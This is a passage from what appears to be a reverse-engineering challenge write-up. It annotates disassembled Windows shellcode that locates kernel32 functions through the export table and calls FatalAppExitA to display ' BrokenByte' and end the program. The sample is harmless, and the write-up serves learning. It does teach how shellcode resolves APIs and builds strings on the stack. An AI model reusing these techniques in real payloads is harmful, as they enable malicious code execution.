; ORD_NUM_ADDR = ORDINAL_TABLE_ADDR + (OFFSET * 2)
; we multiplicate the offset (of the function in the Export
; Table) by 2 because each ordinal number occupies 2 bytes 
0x00000048      668b2c6f       mov bp, word [edi + ebp*2]

; get the RVA of the Address Table, which holds the function
; addresses, and calculate the assolute address
0x0000004c      8b7a1c         mov edi, dword [edx + 0x1c]
0x0000004f      01c7           add edi, eax

; get the RVA and the absolute address of the code of the function
; it uses the formula EDI + EBP*4 - 4 because at offset 0x31
; we have increased EBP by 1, so the function called would be
; FatalAppExitW without -4.
0x00000051      8b7caffc       mov edi, dword [edi + ebp*4 - 4]
0x00000055      01c7           add edi, eax

; set ECX to point to the string " BrokenByte" (with a
; space character at the beginning)
0x00000057      6879746501     push 0x1657479
0x0000005c      686b656e42     push 0x426e656b             ; 'kenB'
0x00000061      682042726f     push 0x6f724220             ; ' Bro'
0x00000066      89e1           mov ecx, esp

; decrease the byte at the end of the previous string, from 0x1
; to 0x00, acting as NULL terminator
0x00000068      fe490b         dec byte [ecx + 0xb]

; set arguments for call to FatalAppExitA
0x0000006b      31c0           xor eax, eax
0x0000006d      51             push ecx
0x0000006e      50             push eax

; call function kernel32.FatalAppExitA
0x0000006f      ffd7           call edi
```

Overall, the shellcode runs the following code:

```cpp
FatalAppExitA(
    0,
    " BrokenByte"
);
```

So it calls the function `FatalAppExitA` to terminate the program and show the message `BrokenByte`.

Some references I found very useful for this challenge, in particular for the PEB and its fields:

- [TEB and PEB – RvsEc0n](https://rvsec0n.wordpress.com/2019/09/13/routines-utilizing-tebs-and-pebs/)
- [Basics of Windows shellcode writing | Ring0x00](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html)

### Challenge 04

### Challenge 05

### Challenge 06

### Challenge 07
